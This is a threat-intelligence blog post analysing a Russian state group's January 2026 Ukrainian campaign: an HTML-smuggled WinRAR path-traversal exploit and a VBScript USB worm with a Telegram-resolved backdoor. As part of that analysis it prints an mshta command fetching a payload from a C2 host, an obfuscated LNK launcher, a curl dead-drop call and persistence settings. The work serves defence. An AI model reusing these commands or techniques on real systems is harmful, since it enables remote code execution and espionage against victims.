# FSB’s matryoshka #1/3: Inside Gamaredon Cyber Operations

- **Source :** sekoia
- **URL :** https://www.sekoia.com/blog/fsbs-matryoshka-1-3-gamaredons-gifts-that-keeps-unpacking-gammaphish-and-gammaworm
- **Date :** 2026-06-01

---

This investigation is published in three parts. Follow the links below to navigate through our findings:

  * FSB’s matryoshka #1/3 - **GammaPhish** and **GammaWorm** (this article)
  * [FSB’s matryoshka #2/3](/blog/fsbs-matryoshka-2-3-gamaredons-gifts-that-keeps-unpacking-gammaload) \- **GammaLoad**
  * [FSB’s matryoshka #3/3](/blog/fsbs-matryoshka-3-3-gamaredons-gifts-that-keeps-unpacking-gammasteel) \- **GammaSteel**



## Introduction

**Sekoia.io’s Threat Detection & Research** (TDR) team closely monitors the activities of Russian Advanced Persistent Threats (APT). In late December 2025, we deployed an opportunistic YARA rule designed to uncover novel initial access vectors. By January 2026, **this rule had generated a dozen hits** , prompting an in-depth investigation. While we successfully identified the **early stages of a Gamaredon infection chain** , unknown restrictions prevented us from fully detonating the sequence to observe the final payloads.

To overcome this, we collaborated with a trusted partner who provided over 70 artifacts retrieved directly from compromised hosts. These artifacts not only corroborated the initial attack stages we observed in December but also contained several distinct malware families historically attributed to Gamaredon: a **worm, loaders and a stealer** , widely tracked by the community as Pteranodon, GammaLoad, and GammaSteel.

While the TDR team has previously modeled multiple Gamaredon campaigns for Sekoia CTI, **tracking this specific intrusion-set consistently presents significant challenges**. Their execution flows are notoriously lengthy and complex. Furthermore, the fragmented naming conventions across the cybersecurity industry, combined with Gamaredon’s rapid iteration of its malware, create technical confusion and obscure the threat's operational comprehension.

To cut through this complexity and provide clarity on Gamaredon’s current capabilities, we decided to **thoroughly document their January 2026 infection chain** , compare the different malware versions, and **align the naming conventions of the malware** based on our own findings. By combining our initial findings with the partner-provided artifacts, we reconstructed an important part of Gamaredon’s long-term campaign, which is still ongoing at the time of writing. In addition, understanding some stages allowed us to replay live network requests to Gamaredon’s Command and Control (C2) servers. This live interaction successfully tricked the staging infrastructure into **delivering the most recent versions of the loaders and the final stealer**.

TDR team is releasing a series of reports dedicated to dissecting Gamaredon’s latest espionage arsenal. This series aims to **comprehensively document the full execution chain and the novel methodologies deployed by the group in 2026** , contrasting our findings with existing open-source intelligence.

Specifically, this first report focuses on the initial access stage and the worm.

## Context

### Gamaredon

This long-term campaign is attributed to **Gamaredon**(aka ACTINUM, Armageddon, UAC-0010, BlueAlpha), a Russian state-sponsored intrusion-set [officially linked by national agencies, such as the Security Service of Ukraine (SSU)](https://ssu.gov.ua/en/novyny/sbu-vstanovyla-khakeriv-fsb-yaki-zdiisnyly-ponad-5-tys-kiberatak-na-derzhavni-orhany-ukrainy), to the **Russian Federal Security Service (FSB)**. Its targeting remains geographically **focused on Ukraine** , specifically aiming at **government** , **military** , and **critical infrastructure** entities. Its primary objective is **cyberespionagecampaigns** by establishing persistent access to continuously exfiltrate sensitive documents. 

### Malware family

Gamaredon’s arsenal has undergone a **significant transformation over the last decade** , transitioning from Pteranodon custom-built framework into a fragmented and modular malware. Based on our observation, today's Gamaredon capacities are characterised by a proliferation and a highly active development cycle of new malware variants.

#### 2013 to 2016: **Off-the-shelf malware**

Historically, according to the 2015 LookingGlass report [Operation Armageddon: Cyber Espionage as a Strategic Component of Russian Modern Warfare](https://www.ecirtam.net/autoblogs/autoblogs/lamaredugoffrblog_6aa4265372739b936776738439d4ddb430f5fa2e/media/88e3da25.Operation_Armageddon_FINAL.pdf), Gamaredon conducted spearphishing campaigns using stolen, highly relevant decoy documents of mimicking Ukrainian institutions to target government entities. These attachments relied on a multi-stage execution chain, often using up to three nested stages, to download and execute off-the-shelf payloads like **Remote Manipulator System (RMS) RAT** , a tool widely shared on Russian hacker forums, or **UltraVNC** , an open-source remote access utility.

#### 2016 to 2021: **The historical framework**

By 2016, as detailed in the Palo Alto Networks report [The Gamaredon Group Toolset Evolution](https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/), operations shifted toward using **Pteranodon** , also tracked as **Pterodo**. Functioning as a custom backdoor and deployment framework, Pteranodon allowed operators to load additional payloads, execute arbitrary commands, capture screenshots, and steal files from local systems and USB drives for C2 exfiltration. Palo Alto noted that Pteranodon continuously evolved with multiple variants. The 2021 [Security Service of Ukraine report](https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf) confirmed this, highlighting massive spear phishing waves and the deployment of distinct modules, such as file and USB stealers, deployed by the Pteranodon framework. Interestingly, the SSU noted that Pteranodon's core was publicly available on Russian hacker forums as early as 2016, with a decryption module posted on GitHub.

#### 2021 to 2026: **The shift to standalone families**

During this period, the fragmentation became increasingly apparent. Security vendors began reporting directly on the standalone modules rather than Pteranodon. In 2021, [CERT-UA identified](https://cert.gov.ua/article/10702) new payloads deployed via Pteranodon, including**a worm, a stealer, and a ransomware**. In 2022, the [Microsoft Threat Intelligence Center (MSTIC)](https://www.microsoft.com/en-us/security/blog/2022/02/04/actinium-targets-ukrainian-organizations/) categorised these payloads as distinct families, notably **PowerPunch**(a loader) and **QuietSieve**(a stealer). That same year, CERT-UA published incident reports ([#3787](https://cert.gov.ua/article/18365) and [#5134](https://cert.gov.ua/article/1229152)) assigning specific names to these modules: the loader and worm combination became **GammaLoad** , while the stealers were designated **GammaSteel**. The worm component was later comprehensively [analyzed by Check Point Research](https://research.checkpoint.com/2023/malware-spotlight-into-the-trash-analyzing-litterdrifter/) in 2023, where it was named **LitterDrifter**.

By this time, references to the Pteranodon framework disappeared from intelligence reports, except in the [RNBO's Gamaredon activity amid Ukraine’s counteroffensive](https://www.rnbo.gov.ua/files/2023_YEAR/CYBERCENTER/Gamaredon_activity.pdf) report in 2023, which categorized the arsenal into **GammaDrop** , **GammaLoad** , and **GammaSteel**. In this context, GammaDrop refers to the initial malicious code responsible for dropping and executing GammaLoad. Between 2023 and 2025, researchers at [ESET](https://web-assets.esetstatic.com/wls/en/papers/white-papers/gamaredon-in-2024.pdf), [RecordedFuture](https://assets.recordedfuture.com/insikt-report-pdfs/2024/cta-ru-2024-1205.pdf), [IBM-X](https://www.ibm.com/think/x-force/hive0051-all-in-triple-threat), [Harfanglab](https://harfanglab.io/insidethelab/gamaredons-pterolnk-analysis/) documented dozens of variants. These analyses are highly valuable, but the varied nomenclature used for new updates makes it challenging to clearly map them. This period marks a strategic shift away from a single-bloc architecture, favoring a highly modular approach where multiple standalone payloads are deployed following the initial spearphishing compromise.

Finally, in December 2025, ClearSky Cyber Security [highlighted a new malware](https://x.com/ClearskySec/status/1995061537183011084) attributed to Gamaredon with medium confidence: **GamaWiper**. This malware, intended to completely wipe a device, appears to be used exclusively against security researchers during sandbox analysis, and according to our partner, **it has never been observed on final victims**.

#### 2026: **A unified taxonomy**

When reviewing this historical timeline, it is clear that while programming languages change and evasion techniques become more sophisticated, the end goals of these malware have remained exactly the same since their first documentation. To bring clarity to this arsenal, we will align with the CERT-UA taxonomy, which consists of combining the "Gamma" prefix with the malware’s primary function. Applying this convention, we have established the following naming patterns:

  * **GammaPhish:** All stages from the initial phishing email up to the deployment of GammaLoad (some stages are formerly known as GammaDrop, PteroDoc).
  * **GammaLoad:** All intermediary components whose sole purpose is to deploy additional payloads (encompassing malware previously known as PowerPunch).
  * **GammaWorm:** All propagating worms (encompassing malware previously known as LitterDrifter, PteroLNK and PterodoUSB).
  * **GammaSteel:** All stealer components (encompassing malware previously known as QuietSieve, USBStealer, HarvesterX, and various Pteranodon stealer modules).
  * **GammaWipe** : All malicious code intended to wipe the system (recently known as GamaWiper)



## Infection chain

### Overview

Based on forensic artifacts recovered from compromised hosts, proactive threat hunting, and live payload acquisition, we have successfully reconstructed a significant portion of a Gamaredon infection chain deployed in January 2026. The execution flow consists of the following observed stages:

**GammaPhish (Initial access):** Through YARA-based hunting, we identified a cluster of weaponized xHTML files distributing a malicious RAR archive. This archive exploits the CVE-2025-8088 vulnerability to extract a hidden HTA file directly into the user’s Windows Startup directory. Upon execution, the HTA file leverages `mshta.exe` to call a remote payload hosted on a C2 server. 

 _Note: During our live analysis, the staging infrastructure has always responded to an empty payload, preventing the acquisition of the next stage from this step._

**GammaLoad (Staging):** We recovered multiple VBScript loaders from the compromised hosts. It seems that these loaders operate in a continuous cascade, with four distinct execution stages observed during our analysis. Their primary objectives are to fingerprint the host system, update the network configuration in the registry using Dead Drop Resolvers (DDRs), fetch and execute arbitrary VBScript payloads from the C2 servers.

**GammaWorm (Propagation):** Forensic analysis of compromised hosts revealed a highly obfuscated VBScript worm. It establishes persistence via scheduled tasks and actively conceals its core modules within NTFS Alternate Data Streams (ADS). The propagation module specifically targets USB and network drives, hiding legitimate directories, replacing them with malicious LNK shortcut files, and forge a second type of LNK shortcuts that use Ukrainian social engineering lures. The worm maintains a dynamic network configuration by scraping DDRs and storing the active C2 infrastructure within the Windows registry. Ultimately, the worm enters an infinite execution loop, acting as a backdoor, to query its network configuration and execute arbitrary code returned by the C2.

**GammaSteel (Exfiltration):** By actively replaying the network requests generated by GammaLoad, we successfully acquired a new version of GammaSteel, a modular PowerShell stealer. This payload stages itself entirely within the Windows registry, writing 71 distinct modules that are individually encrypted using the Windows Data Protection API (DPAPI). GammaSteel manages three concurrent data acquisition mechanisms: recurring scans of local and network drives, hardware event monitoring for newly inserted USBs, and real-time surveillance of specific files as they are saved or modified. Targeted files are exfiltrated to an S3-compatible cloud storage provider. If the primary cloud infrastructure fails, GammaSteel falls back to operator-controlled C2 servers, which double as an active backdoor for further arbitrary remote code execution.

**Other payloads:** While this reconstructed infection chain includes dozens of individual files and scripts, it is highly probable that other malware such as the GammaWipe could be deployed depending on the operator's objectives.

From a technical view, our investigation confirms that GammaLoad is directly responsible for deploying the GammaSteel payload. However, the exact deployment vector for GammaWorm remains ambiguous; it could be dropped concurrently by GammaLoad, or introduced independently via a user executing a weaponized USB drive. In addition, assessing the global execution flow, we assess with high confidence that GammaPhish is designed to deploy GammaLoad first.

Throughout this infection chain, we observed zero traces of the historical Pteranodon framework. The operator has entirely shifted toward deploying a fragmented array of standalone malware. What stands out most in this new architecture is redundancy: at every single stage of the infection, the malware retains the capability to independently retrieve and execute arbitrary remote VBScript code. This confirms the definitive transition **from a single-block framework to a modular ecosystem** where every component doubles as a functional backdoor.

For this first report, we will focus on **GammaPhish** and **GammaWorm** exclusively.

### GammaPhish

We did not identify the initial delivery vector preceding the xHTML file. Based on [ESET reporting](https://www.welivesecurity.com/en/eset-research/gamaredon-2024-cranking-out-spearphishing-campaigns-ukraine-evolved-toolset/), we assess the file is likely delivered as an attachment to a spearphishing email or contained within an archive attached to such an email. For our analysis, we took a sample called `1_13_5_1691_09.12.2025.xhtml` (MD5sum: `1794369214b7f62e70a0485e61335c61`). The infection chain starting from the xHTML file is shown in the following graph:

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c75_6a92a14019d5c59537697100_6a2a808488a9f8ef9bd71da0.webp)

First, to entice the user, the page displays a simple `DOCUMENT DOWNLOADED` text. But at the same time, it initiates a reporting mechanism. Upon opening, it sends a request to `hxxp://iiwdsxwamylbwwsoyrmj.supabase[.]co/functions/v1/clever-responder/KokonGoogle_09.12.2025` to load a 1x1 pixel image. This technique is used to confirm to the operator that the victim opened the lure document and has been employed by Gamaredon since at least 2018.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c65_6a92a13dcd1cab63350c10d8_6a2a808388a9f8ef9bd71d8c.webp)

Then, the code triggers a load failure for a non-existent external resource, which activates a JavaScript `OnError` event containing the malicious payload. This code executes only if the User Agent matches specific Windows identifiers: `['Win32', 'Win64', 'Windows', 'WinCE']`. Next, it initiates a HTML Smuggling technique with a Base64-encoded RAR archive embedded in its source code, named `2_14_6_1033_09.12.2025.rar` and exploiting CVE-2025-8088. In order for the execution chain to proceed, the user must manually open the downloaded RAR archive.

#### CVE-2025-8088 

The archive used by Gamaredon exploits [**CVE-2025-8088**](https://nvd.nist.gov/vuln/detail/CVE-2025-8088), a critical path traversal vulnerability affecting WinRAR versions prior to 7.13 published on 8 August 2025. 

This vulnerability can be leveraged to achieve remote code execution if a file is written to specific locations, such as persistence paths (e.g., Programs\Startup) as PowerShell profile, or by replacing a DLL to exploit a DLL search order hijacking vulnerability. 

Google Threat Intelligence Group [released a report](https://cloud.google.com/blog/topics/threat-intelligence/exploiting-critical-winrar-vulnerability?hl=en) regarding this CVE during the course of Sekoia.io’s investigation. This publication documented the **exploitation of this vulnerability** by Russian operators **Sandworm** , **Turla** , **Gamaredon** , and China-nexus intrusion-sets. 

Visually, the archive appears to contain a single PDF file and a folder called `..` . 

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c68_6a92a13ce36224e46e909aad_6a2a808388a9f8ef9bd71d89.webp)

 _Screenshot of the weaponized RAR archive_

However, it actually contains **two file entries** : 

  * A dummy PDF: `Повістка про виклик підозрюваного_2_14_6_1033_09.12.2025.pdf`
  * A HTA file intended for extraction via path traversal: `..\..\..\..\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ Startup\2_14_6_1033_09.12.2025.HTA`



The PDF appears to contain likely random strings. When the user manually extracts the PDF file to any location on its device, the HTA file is extracted to the `C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` directory. Upon the next user login, Windows will attempt to open recognised files located in the specific user's Startup folder (this behaviour is native in Windows and available for any executable files only, _e.g._ HTA, EXE, BAT, CMD, VBS, PS1, LNK.). Interestingly, [the SSU documented](https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf) Gamaredon leveraging this same TTP as early as 2018 exploiting [CVE-2018-20250](https://www.cve.org/CVERecord?id=CVE-2018-20250).

The extracted HTA file contains a VBScript blob comprising approximately 90% of junk and obfuscated code. This code instantiates a `WScript.Shell` object to execute `mshta.exe`, passing a payload hosted on a remote server as an argument. Of note, the URL argument implements a fake authentication scheme by adding `www.bbc.com`, to appear legitimate for any user inspecting the request. The final command is as follows:

`%WINDIR%\system32\mshta.exe hxxps://www.bbc.com@iiwdsxwamylbwwsoyrmj.supabase.co/functions/v1/clever-responder/GurGoogle_09.12.2025/audience/capture.pdf`

We were unable to retrieve the `capture.pdf` payload requested by this command, as all tested C2 servers were unresponsive. Because `mshta.exe` executes the content of this file, this mechanism effectively grants the operator arbitrary remote code execution capabilities. Based on historical Gamaredon’s TTPs, this stage most likely downloads and executes **GammaLoad**. However, from a technical view , the operator could deploy any other malware from their arsenal, such as **GammaWorm**.

### GammaWorm

GammaWorm executes a multi-stage process. Our analysis focuses on the specific file named `~.gif`, identified by the MD5 hash `8e1624d110c090ff57d4b493a9107c66`.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c62_6a92a141693fca262e1a3931_6a2a808488a9f8ef9bd71da3.webp)

It perform the following actions:

  * **Installation, clone and mutex:** GammaWorm operates as a massive and dynamically assembled VBScript payload (>20,000 lines). It copies its core logic into a first ADS and establishes a killswitch within a secondary ADS.
  * **Persistence:** Survival across system reboots is created through a multi-layered approach. GammaWorm creates registry entries inside `CurrentVersion\RunOnce` that will execute its copy, modify Explorer registry settings to conceal its artifacts, and leverage the native Windows COM API to install multiple scheduled tasks that trigger specific modules stored in ADS.
  * **Propagation:** It explicitly targets network shares and USB drives. The module recursively drops full copies of GammaWorm, hides legitimate directories, and replaces them with weaponized LNK shortcut files. These decoys leverage Ukrainian social engineering lures and employ a dual-execution mechanism to open the expected folder while silently executing GammaWorm.
  * **Backdoor:** GammaWorm maintains an infinite execution loop, acting as a backdoor capable of arbitrary remote code execution. It resolves its C2 infrastructure via Dead Drop Resolvers and exfiltrates host fingerprints entirely within randomized HTTP headers.



#### Installation, clone and mutex

In order to deploy various modules, GammaWorm relies on an Alternate Data Stream (ADS) technique. This marks a highly notable evolution compared to previous versions.

#### NTFS Alternate Data Streams (ADS) 

GammaWorm leverages NTFS Alternate Data Streams (ADS), a native Windows feature designed to support compatibility with the Macintosh HFS file system. 

This feature allows multiple independent data streams to be associated with a single file entry or a directory. Instead of dropping a standalone file, an operator can write a payload directly to an existing path using the syntax [PATH]:[STREAM_NAME]. The data stream resides on the disk but remains invisible to standard directory listings (e.g., Windows Explorer) and does not alter the visible size of the host folder. Of note, display these streams requires specific command-line, such as dir /R or Get-Item -Stream *, as they evade standard file enumeration. 

In the following example, we initiate the creation of the ADS %USERPROFILE%:payload from the Desktop directory. While a standard dir command executed within the user profile fails to list the stream, the dir /R successfully reveals it, even when it runs from a separate location (in this case, the Desktop folder). 

`# 1. Creation of an ADS  
C:\Users\[USER]\Desktop> echo "This is a example content." > "%USERPROFILE%:payload"  
  
  
# 2. Shows files & folder  
C:\Users\[USER]\Desktop> dir  
Directory of C:\Users\[USER]  
09/04/2023 12:28 PM DIR Contacts  
09/04/2023 12:28 PM DIR Videos  
  
[...]  
  
  
# 3. Shows files & folder from another directory with /R  
C:\Users\[USER]\Desktop> dir /R  
Directory of C:\Users\[USER]\Desktop  
02/03/2026 09:43 PM DIR .  
31 ..:payload:$DATA  
[...]  
`

Moreover, it employs massive string concatenation to self-assemble its core VBScript payload directly in memory. After deobfuscation, the `~.gif` payload exceeds 20,000 lines of code, which are dynamically loaded and executed via the ExecuteGlobal VBScript function. Notably, the vast majority of this script consists of benign or completely non-functional operations, serving strictly as an anti-analysis mechanism to hinder reverse engineering.

Once executed, GammaWorm locates its code on the disk and reads its content to replicate itself. It primarily attempts to clone into the `%USERPROFILE%:GTR` ADS. If this write operation fails, GammaWorm falls back to a standard path `%USERPROFILE%\boot.ini`. 

 _Note: This mechanism likely serves as a fallback if the compromised file system does not support ADS creation. However, since the GammaWorm does not implement standard path fallbacks for every of its ADS write operations, we assess that this specific action is likely a remnant of legacy code from an earlier version._

Next, GammaWorm establishes a second ADS at `%USERPROFILE%:save`, acting as a killswitch for a separate module, which we will analyse later in this report.

#### Persistence and propagation

GammaWorm implements multiple persistence mechanisms to ensure survival across system reboots, including registry keys and scheduled tasks.

##### Registry keys

First, GammaWorm establishes its persistence of his code by writing a registry entry in `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\ExplorerGuard` that will execute the ADS `C:\Users\[USER]:GTR` (a full copy of GammaWorm) via `wscript.exe`. Since the entry is located in the `RunOnce` key, the payload will execute automatically upon the user's next logon, but it will be deleted immediately after the command is launched. However, because the newly executed GammaWorm (from the full copy) is executed, it recreates this registry entry, so this configuration is indeed permanent.

Next, to mask its future propagation activities, GammaWorm alters several registry keys within `HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\`. The modifications are detailed in the table below.

**Modified registry key value name** Value set (Hex)ImpactHidden0x2Disables display of hidden files.ShowSuperHidden0x0Hides protected operating system files.HideFileExt0x1Hides file extensions for known types.

These changes effectively degrade the system's visibility settings, allowing the operator to conceal the specific files and directories required for the GammaWorm’s propagation module.

##### Scheduled tasks

Following the registry modifications, GammaWorm establishes persistence by creating scheduled tasks. Each scheduled task is configured to execute a module concealed within an ADS created during the cloning phase.

###### DiskDiagnosticDataCollector task - Set network configuration

To maintain a resilient connection with C2 server, GammaWorm establishes a persistence mechanism masquerading as a system maintenance tool. A scheduled task named `DiskDiagnosticDataCollector` is created under the path `\DiskDiagnostic\Microsoft\Windows\`, configured with a repetition interval of 7 minutes. This task executes the payload stored in the `C:\Users\[USER]:URL` ADS, which is part of the `~.gif` code that can be defined as a separate module and uses Dead Drop Resolver technique. The primary objective of this module is to retrieve and maintain a live network configuration in the registry base.

First, the module initiates with a hardcoded URL pointing to: `hxxps://graph[.]org/ kyjfkyr-12-06`.

_Note: graph[.]org is a mirror domain for telegra[.]ph, a legitimate publishing tool provided by Telegram._

The execution flow is as follows:

  * **Initial fetch:** The code parses the HTML content of the webpage to extract a new URL.
  * **Registry staging:** This extracted URL is stored in two specific registry keys under both `HKCU\Console\WindowsUpdates` and `HKCU\Console\WindowsResponby`.
  * **Recursive resolution:** The module reads these newly written registry values to initiate a fresh GET request. This process is repeated five times in a recursive loop, allowing GammaWorm to progressively resolve all the domains and resource paths it needs.



The following captures demonstrate how the C2 servers are hosted on the various page:

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c5f_6a92a1427061c6682ff3bc9f_6a2a808488a9f8ef9bd71dc6.webp)

_Screenshots of the C2 servers hosted on Telegram (top), Teletype (left) and Telegraph (right)_

This module employs a hybrid infrastructure, mixing legitimate web services (Telegram or Cloudflare) with its own custom domains (here, `quitethepastry[.]ru` or `104.194.140[.]6`) to maintain a resilient network of C2 servers.The table below details the complete registry modifications observed during our analysis in late January 2026:

**URL requestedRegistry key path written in** HKCU\Console\**Data written** hxxps://graph[.]org/kyjfkyr-12-06WindowsUpdatesWindowsResponbyhxxps://bold.zsjtn41091.workers[.]devhxxps://bold.zsjtn41091.workers[.]devWindowsDetect@myrain/Xh1Lta2Ccrohxxps://teletype[.]in/@myrain/Xh1Lta2CcroURLTeletypehxxps://quitethepastry[.]ruhxxps://quitethepastry[.]ruWindowsTelegraf8bfl6sp-01-02hxxps://telegra[.]ph/f8bfl6sp-01-02URLTelegrahxxps://moment-cat-qld-place.trycloudflare[.]com/sylvilagushxxps:/t[.]me/s/teotoriIpURL104.194.140[.]6

This approach secures the stability of the infection chain, as every value committed to the registry will be used for the next stages.

###### SilentCleanup task - Propagation and infection

Next, a second scheduled task named SilentCleanup, is created in `\CertificateServicesClient\SystemTask\`. This task executes the following command every 7 minutes and runs the VBScript code stored within the `C:\Users\[USER]:LNK` ADS, which acts as a module to propagate and infect new devices.

Upon execution, this module first checks the existence of the `%USERPROFILE%:save` ADS. If this ADS exists and is smaller than 100 bytes, the process terminates. This mechanism is a killswitch, initialised with hardcoded strings. However, if the file size exceeds 100 bytes, the module reads the content of `%USERPROFILE%:GTR` (which is a full copy of GammaWorm) and retains it in memory and the propagation can begin. Conversely, if the ADS does not exist, the module reads `%USERPROFILE%\boot.ini` instead.

To identify propagation targets, the module lists available hardware and network devices by executing the WMI query `select * from win32_logicaldisk where mediatype=null`. This query includes network drives (e.g., SMB mounts) or low-cost USB drives, and it filters out the system drive (MediaType `12`), optical drives (MediaType `5`), and standard removable media (MediaType `11`). 

Upon identifying a target drive, the module initiates its propagation. It begins by reading the payload in memory (previously copied from the `%USERPROFILE%:GTR` ADS or `%USERPROFILE%\boot.ini`). This payload is then written to a new file named `~.gif` (the same name of the current GammaWorm) directly at the root of the targeted drive.

The module iterates from the root level through all folders. It modifies their attributes to Hidden and System, removing them from the user's standard view. To replace these vanished directories, the module creates malicious LNK files that bear the exact directory name and utilise the standard folder icon. These specific folder shortcuts employ a dual-execution command via `mshta.exe`. Once these LNK are opened, they:

  * Open the legitimate hidden folder in Windows Explorer.
  * Execute the `~.gif` worm.



The command embedded in these LNK is as follows:

`# Original command  
mshta.exe "javascript:eval('function f(x){return x.split(\"\").reverse().join(\"\");};s=f(\"nur\");y=f(\"llehS.tpircSW\");w=new ActiveXObject(y);window[\"w\"][s](\"explorer [FOLDER_PATH]\");window[\"w\"][s](\"wscript.exe ~.gif //b //e:vbScript \");window.close()')"  
  
# Deobfuscated version  
mshta.exe "javascript:eval(  
var shellObject = new ActiveXObject("WScript.Shell");  
shellObject.Run("explorer [FOLDER_PATH]");  
shellObject.Run("wscript.exe ~.gif //b //e:vbScript");  
window.close();  
)"  
`

Secondly, the module employs a logic based on directory content to generate a second type of LNK shortcut. If the current directory contains less than four items, it generates decoy LNK files. Unlike the previous LNK, these decoy files link directly to the `~.gif` payload via `wscript.exe`. This infection process is recursive and extends into subdirectories up to a hardcoded depth of four subfolders. As the module descends into the drive, it continues to replicate the `~.gif` payload into every single directory it visits. However, the fake LNK folder is not created for these subdirectories; folders remain visible to the user but the decoy generation with simple LNK executing `~.gif` worm remains active.

Both LNK decoy files use a social engineering technique based on Ukrainian filenames. The list of hardcoded filenames and their automatic English translation is the following: 

**Hardcoded filename for LNKMachine translation to English  
(reviewed by an analyst)**бланк шапка.docletterhead form.docкарта обліку.docaccounting card.docпроект листа.docdraft letter.docвідрядження.docdeployment.docрнбо.docrnbo.docсписання військового майна загиблих.docwrite-off of military property of the deceased.docвідомость роздавальна.docdistribution sheet.docтаємно.docsecret.doc116_1_914 дск.doc116_1_914 dsk.docфото військовополоненого.jpegprisoner of war photo.jpegфото сперма в жопе.jpegphoto sperm in ass.jpegзгвалтування.jpegrape.jpegпорно-фото.jpegporn-photo.jpeg

 _Hardcoded filenames and their automatic English translation_

This list contains some shocking words to grab the user's attention and lure them into opening these files. To summarise the behaviour of this propagation module, here is a graph showing the state of a USB or network drive before and after the infection:

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c5c_6a92a13bdc30711238318c8e_6a2a808388a9f8ef9bd71d86.webp)

###### SmartRetry tasks - Clone of DiskDiagnosticDataCollector

Finally, a third scheduled task named `SmartRetry`, is created in `\InstallService\ScanForUpdatesServer\`. This task is a clone of the `DiskDiagnosticDataCollector` task. It executes every 10 minutes and runs the VBScript code stored within the `C:\Users\[USER]:SERVER ADS`, which a full clone of the `C:\Users\[USER]:URL` ADS analysed before and that retrieves and stores C2 server configuration in the registry.

#### A backdoor inside the worm

Following installation and propagation, GammaWorm enters an infinite execution loop to initiate communication with its C2 server.

To resolve its C2, GammaWorm employs once again a DDR technique. It initiates a GET request via `curl` to a hardcoded public Telegram channel `hxxps://www.telegram[.]me/s/oberfarir`. Accessing this channel requires neither a Telegram account nor the application.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c59_6a92a13edc30711238318e39_6a2a808388a9f8ef9bd71d8f.webp)

_Screenshot of the Telegram channel hosting a C2 server_

GammaWorm executes the following command to retrieve the channel content:

`curl.exe hxxps://www.telegram.me/s/oberfarir -o C:\Users\[USER]\AppData\Local\Temp\cancelH0S.mpg`

The HTML content of the page is saved to the current user's temporary directory. GammaWorm parses this file to extract an obfuscated IP address using the regular expression. Once deobfuscated, this IP address is used as the destination for a custom POST request.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a5223e6167cebbf75c6b_6a92a13f19d5c595376970bb_6a2a808388a9f8ef9bd71d92.webp)

This POST request is designed to exfiltrate the compromised machine's fingerprint via the HTTP headers, which are populated with randomised values calculated on the fly. The exhaustive list of randomly selected and hardcoded values is shown in the following table:

**FieldValue** URL pathpointed, goats, messenger, complaint, baby, selfish, retired, abundance, drill, comicsURL filename8 random characterURL file extensionmbx, mid, html, php, xml, htm, xhtm, 3gpp2, wav, mts, ato, aspx, asp, jsp, css, jsasf, swf, download, mpg, jpg, mpeg, nefSeparator 1::, ##, !!, ??, ==Separator 2_, @, #, =, %, ?, !Separator 3/., /#, /!, /?, /=User-Agent injection[Separator 1] + [Computer name] + [Separator 2] + [Serial disk (hex)] + [Separator 1] + [Separator 3] + "n" + [Random string] + [Separator 3]Referer“www” +.com, .gov.tk, .gov.md, .gov.sk, .pl, .it, .org, .nato.int, .net.ua, .mfa.gov.ua, .mil.gov.ua, .gov.pl, .gov.tr, .ua, .gov.uaCookie namepointed, goats, messenger, complaint, baby, selfish, retired, abundance, drill, comicsCookie value10 random characterAccept-languageen-US, en;q=0.[random 1 - 9]ru-RU, ru;q=0.[random 1 - 9]fr-CH, fr;q=0.[random 1 - 9]zh-CN, zh;q=0.[random 1 - 9]Content-LengthRandom value between 2916 and 6966ConnectionKeep-AliveCache-Controlno-cache

Notably, the request does not contain a body payload. Instead, the victim's data is embedded within the User-Agent string. This string is constructed using native VBSscript functions:

  * Retrieves the hostname via `WScript.Shell.ExpandEnvironmentStrings("%computername%")`
  * Retrieves the `C:` drive serial number and convert it to hexadecimal via `Hex(FileSystemObject.GetDrive("C:").SerialNumber)`



Upon sending the request, the behaviour diverges based on the HTTP status code received from the C2 server.

  * **The C2 responds with HTTP 200 OK** : it retrieves the response body and converts it to text via `ADODB.Stream`. If the text contains HTML content, the execution halts. This suggests a mechanism designed to generate network noise or mimic legitimate traffic. If the tag is absent, the content is parsed as valid VBScript. It deobfuscates the data by removing carriage returns and operator-inserted `&&` markers. It then decodes the content from Base64 to cleartext and executes it immediately in memory using the `ExecuteGlobal` function.
  * **The C2 responds with HTTP 404 Not Found** : Contrary to standard protocol, a `404` error triggers a configuration update. It parses the response body using specific delimiters (`/` and `?`) to extract configuration data and update Windows registry keys.



In a controlled environment, we reproduced a POST request that resulted in a `404` response containing the following string: 

`hxxps://efficiency-planes-emotions-fascinating.trycloudflare[.]com/@myrain/Xh1Lta2Ccro?84wtj9ob-01-31`

It splits this string into three parts:

  * **C2 domain:**`hxxps://efficiency-planes-emotions-fascinating.trycloudflare[.]com` is written to `HKCU\Console\WindowsResponby` and `HKCU\Console\WindowsUpdates`.
  * **Telegra.ph endpoint:**`84wtj9ob-01-31` is written to `HKCU\Console\WindowsTelegra`.
  * **Teletype.in endpoint:**`@myrain/Xh1Lta2Ccro` is written to `HKCU\Console\WindowsDetect`.



Following the POST request, GammaWorm enters a hardcoded 28-second sleep cycle before reiterating the C2 communication process. 

This infinite loop confirms its function as a backdoor, granting the operator the ability to execute arbitrary VBScript remotely or update the C2 configuration on the fly.

## Conclusion

In this long-term campaign, Gamaredon continues its relentless focus on Ukrainian targets, particularly government entities. This infection chain reveals a **resilient, massive, and highly obfuscated modular design**. Because of its adaptability and the operator's ability to update configurations on the fly, it is highly likely that this architecture will be reused in the future.

